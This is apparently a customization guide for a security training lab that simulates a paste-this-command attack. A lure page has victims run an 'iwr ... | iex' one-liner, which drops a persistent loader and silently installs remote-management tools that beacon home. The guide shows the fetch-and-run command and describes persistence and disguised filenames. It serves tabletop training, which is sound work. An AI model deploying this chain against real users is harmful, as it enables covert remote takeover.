# Extending the TTX Lab — make it your own

A fork-and-customize guide for adding new RMM tools and adapting the lab.
Everything here is optional — the lab works out of the box with the two
shipped tool modules (Splashtop, RustDesk).

## How the pieces fit (30-second tour)

    ./setup.sh                host-side menu -> writes .env (RMM_TOOL=...)
    docker compose up        passes RMM_TOOL into the container
    entrypoint.sh             starts nginx + a cloudflared quick tunnel
      |- select-rmm.sh        validates the tool, injects it into rmm.ps1
      |- set-url.sh           bakes the fresh tunnel URL into the payloads
    victim pastes command     iwr .../stage1.ps1 | iex
      |- stage1.ps1            drops rmm.ps1 to disk + logon persistence
          |- rmm.ps1           tool-agnostic loader: fetches install.ps1
              |- ttx/rmm/<tool>/install.ps1   downloads payload, installs,
                                               beacons progress home

**Design rule:** tool-specific knowledge lives ONLY in `ttx/rmm/<tool>/`.
The core files (`index.html`, `stage1.ps1`, `rmm.ps1`, `set-url.sh`)
never change when you add a tool.

## Adding a new RMM tool

### 1. Create the module folder

    mkdir ttx/rmm/<newtool>

Use a short lowercase id, no spaces — it appears in URLs
(`/ttx/rmm/<id>/...`), beacon names, and file names.

### 2. Write the manifest: `ttx/rmm/<newtool>/manifest`

A shell key=value file read by `setup.sh` and `select-rmm.sh`:

    TOOL_ID=screenconnect
    DISPLAY_NAME="ScreenConnect Client (silent)"
    PAYLOAD_FILE=client.msi
    CHECK_PROCESS=ScreenConnectClient
    README="Get the .msi from your ScreenConnect admin page"

- `TOOL_ID` — must match the folder name
- `PAYLOAD_FILE` — the exact filename victims download; case-sensitive
- `CHECK_PROCESS` — process name (no `.exe`) meaning "already installed"
- `README` — shown by `setup.sh` when the payload is missing

### 3. Write the victim-side logic: `ttx/rmm/<newtool>/install.ps1`

Copy `ttx/rmm/rustdesk/install.ps1` as a template. It is **dot-sourced
by `rmm.ps1`**, so these are already in scope — do NOT redefine them:

- `$Base` (e.g. `https://x.trycloudflare.com/ttx`) — build every download
  URL from it: `"$Base/rmm/<newtool>/<payload>"`
- `$BeaconUrl`, `$Log`, and the `Beacon()` helper

Conventions to keep:

- prefix every beacon name with your tool id
  (`<newtool>-installed`, `<newtool>-notready`, ...)
- on fatal errors, beacon first, then `return`
- handle the "already running" case — skip the install but still do your
  end-of-run reporting (see the rustdesk module for the pattern)
- ASCII only, Windows PowerShell 5.1 syntax (victims run stock
  Windows PowerShell, which parses non-BOM files as ANSI)

### 4. Place the payload binary

Put it at `ttx/rmm/<newtool>/<PAYLOAD_FILE>` on the Docker host. The
folder is bind-mounted, so no rebuild is needed — `.gitignore` already
covers `*.msi` / `*.exe` under `ttx/rmm/*/` (payloads are deployment-
or team-bound and should never be committed).

### 5. Add a cleanup module: `cleanup-scripts/tools/<newtool>.ps1`

So victims can be reset between runs. It is dot-sourced by
`cleanup-victim.ps1` (the `Did` / `Skip` helpers are in scope). Clean, in
order: the agent process, the installed program (registry Uninstall keys),
its data folders, and the payload file your `install.ps1` downloads.
See `tools/rustdesk.ps1` for a full example.

### 6. Test it

    ./setup.sh                                  # your tool appears in the menu
    docker compose up -d --build
    URL=$(docker logs ttx-lab | grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' | head -1)
    curl -I $URL/ttx/rmm/<newtool>/<payload>    # 200 = payload served

Then paste the command on a test victim and watch for your beacons:
`docker logs -f ttx-lab`.

## Customizing the other parts

| File | What people tweak |
|---|---|
| `ttx/index.html` | lure page look, copy behavior, F-key facilitator console, `DEFAULT_PAYLOAD` command |
| `ttx/stage1.ps1` | dropped filename (`WindowsVerification.ps1`), task name, stage1 beacons |
| `ttx/rmm.ps1` | loader fallback tool, loader beacons |
| `ttx/rmm/splashtop/install.ps1` | `dcode` deployment code |
| `ttx/rmm/rustdesk/install.ps1` | `$Password`, `$ConfigString` (self-hosted/Pro) |
| `ttx/set-url.sh` | add any NEW top-level payload file that hardcodes URLs (per-tool `install.ps1` files are already globbed) |
| `nginx.conf` | log format for the beacon "console" |

Conventions worth keeping when you fork: ASCII-only PowerShell, LF line
endings for shell scripts, and the two placeholder systems —
`__RMM_TOOL__` in `rmm.ps1` (injected by `select-rmm.sh`; keep exactly
one occurrence so the sed can't hit anything else) and
`http://YOUR-HOST:8000` in payloads (rewritten by `set-url.sh`).

## Authorized use / disclaimer

This project is a training aid for cybersecurity education and tabletop
exercises. Run it only against systems you own or are explicitly
authorized to test, and hand the lure URL only to consenting
participants. You are responsible for complying with the policies of any
environment you run it in and with applicable law. The authors accept no
liability for misuse.
